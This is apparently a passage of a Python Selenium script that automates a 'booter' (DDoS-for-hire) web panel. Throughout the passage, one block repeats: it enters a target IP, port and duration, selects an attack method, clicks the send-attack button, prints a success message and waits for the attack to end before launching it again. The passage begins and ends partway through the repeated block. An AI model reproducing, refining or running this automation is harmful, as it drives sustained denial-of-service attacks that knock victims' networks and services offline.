seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

